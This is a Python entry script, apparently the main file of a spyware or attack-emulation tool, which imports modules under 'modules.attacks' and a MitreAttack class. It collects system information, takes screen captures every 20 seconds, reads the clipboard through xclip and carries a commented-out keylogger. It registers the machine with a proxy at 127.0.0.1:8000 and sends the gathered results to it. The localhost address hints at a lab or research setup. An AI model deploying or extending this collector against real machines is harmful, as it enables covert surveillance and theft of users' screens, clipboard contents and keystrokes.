from pathlib import Path
from tools import _path_joiner

from modules.attacks.capture_screen import CaptureScreen
from modules.attacks.keylogger import KeyLogger
from modules.attacks.clipboard import ClipBoard
from modules.attacks.sys_info import SystemInfo
from modules.attacks.sys_info import SystemInfo
from modules.attacks.attack import MitreAttack
from modules.proxy.proxy import Proxy


from rich import print

# Path
BASE_PATH = Path(__file__).parent
DATA_PATH = _path_joiner(BASE_PATH, 'data')
KEY_LOG_PATH = _path_joiner(DATA_PATH, 'keylog')
SCREEN_CAPTURE_PATH = _path_joiner(DATA_PATH, 'screen_captures')

# System Info 
SYS_INFO = SystemInfo.get()
print(SYS_INFO)
print()

# instances

_proxy = Proxy(
    base_uri="http://127.0.0.1:8000",
    version="v1"
)

_screen_capture = CaptureScreen(
    file_path=SCREEN_CAPTURE_PATH,
    period=20,
    proxy=_proxy
)


_clipboard_attack = ClipBoard(
    os=SYS_INFO.get('os_name'),
    commands={
        "Linux": ['xclip', '-selection', 'clipboard', '-o'],
        "Windows": [],
        "Mac": []
    },
    proxy=_proxy
)

## Deactivated
# _keylogger = KeyLogger(
#     log_path=_path_joiner(DATA_PATH, 'keylog.txt')
# )


# Register the machine
_proxy.register_machine(machine_data=SYS_INFO)
# Send sys info attack result
result = _proxy._generate_result_data(
    **SystemInfo._get_result()
)
_proxy.send_result(result)